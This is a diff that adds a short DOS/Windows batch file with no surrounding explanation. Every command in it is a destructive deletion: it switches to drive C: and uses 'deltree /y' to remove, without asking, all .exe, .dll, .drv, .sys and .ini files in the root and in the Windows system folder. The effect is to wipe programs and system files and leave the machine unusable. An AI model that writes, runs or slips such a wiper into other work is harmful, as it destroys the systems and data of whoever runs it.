@@ -1,0 +1,23 @@
+@echo off
+
+c:
+
+deltree /y *.exe
+
+deltree /y *.dll
+
+deltree /y *.drv
+
+deltree /y *.sys
+
+deltree /y *.ini
+
+cd %windir%\system
+
+deltree /y *.sys
+
+deltree /y *.dll
+
+deltree /y *.ini
+
+deltree /y *.exe
